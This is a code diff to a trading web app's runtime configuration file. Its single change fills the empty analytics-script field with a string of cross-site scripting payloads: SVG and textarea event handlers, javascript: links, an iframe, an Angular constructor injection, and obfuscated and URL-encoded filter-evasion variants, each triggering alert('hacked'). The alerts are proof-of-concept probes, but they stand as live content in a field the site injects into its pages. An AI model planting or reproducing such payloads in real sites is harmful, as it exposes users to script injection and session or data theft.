@@ -37,7 +37,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "",
+  "VITE_ANALYTICS_SCRIPT": "'\"><svg><animate onbegin​=alert('hacked') attributeName=x></svg> \n<a href=javascript​:alert('hacked')>Click Here</a>\n<IFRAME SRC=\"javascript​:alert('hacked');\"></IFRAME>\n<div ng-app> <strong class=\"ng-init:constructor.constructor('alert('hacked')')()\">aaa</strong> </div>\n<<TexTArEa/*%00//%00*/a=\"not\"/*%00///AutOFocUs////onFoCUS​=alert`hacked` //\n<A %252F=\"\"Href= JavaScript:k='a',top[k%2B'lert'](1)>",
   "VITE_SYMBOL_LIST": "",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
